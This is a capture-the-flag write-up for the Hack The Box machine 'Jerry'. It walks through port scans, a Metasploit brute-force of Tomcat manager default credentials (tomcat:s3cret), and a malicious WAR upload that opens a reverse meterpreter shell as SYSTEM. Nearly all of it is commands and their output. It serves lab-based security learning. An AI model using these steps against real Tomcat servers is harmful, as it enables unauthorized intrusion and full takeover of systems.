# Jerry
## Information disclosure
## Metasploit
``````

➜  ~ rustscan -a jerry.htb --ulimit 5000  

Open 10.10.10.95:8080

➜  ~ sudo nmap -Pn -sV -T4 -oA ~/htb jerry.htb --vv 

PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1

➜  ~ sudo nmap -Pn -A -T4 jerry.htb --vv 

PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

Go to:

http://jerry.htb:8080

Information disclosure:

Apache Tomcat/7.0.88

Go to:

Server status
Input:

admin:admin

Go to:

http://jerry.htb:8080/docs/html-manager-howto.html#Upload_a_WAR_file_to_install

After some GoogleFu:

https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/

There is a metasploit module that does all the leg work to upload war file
After skipping enumeration phase due to having valid credentials admin:admin fails

Go to: (Manager App on main page):

http://jerry.htb:8080/manager/html

Response:

For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.

<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>

The generic credentials work

Alternatively,

https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/

msf6 > use auxiliary/scanner/http/tomcat_mgr_login 
msf6 auxiliary(scanner/http/tomcat_mgr_login) > options
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.10.10.95
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

Response:

[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret

sudo msfconsole
msf6 > search tomcat_mgr_upload
msf6 exploit(multi/http/tomcat_mgr_upload) > show options
msf6 exploit(multi/http/tomcat_mgr_upload) > set rhosts 10.10.10.95
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > set lhost tun0
msf6 exploit(multi/http/tomcat_mgr_upload) > run
meterpreter > shell
C:\apache-tomcat-7.0.88>whoami

whoami
nt authority\system

C:\apache-tomcat-7.0.88>cd ..
C:\>cd Users\Administrator\Desktop\flags
C:\Users\Administrator\Desktop\flags>type *  
type *

2 for the price of 1.txt

user.txt

user_flag

root.txt

root_flag

``````

![image](https://0xc0rvu5.github.io/docs/assets/images/20220622115258.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220622115617.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220622120523.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220622121246.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220622122212.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220622125933.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220622130017.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220622130528.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220625004257.png)

#hacking
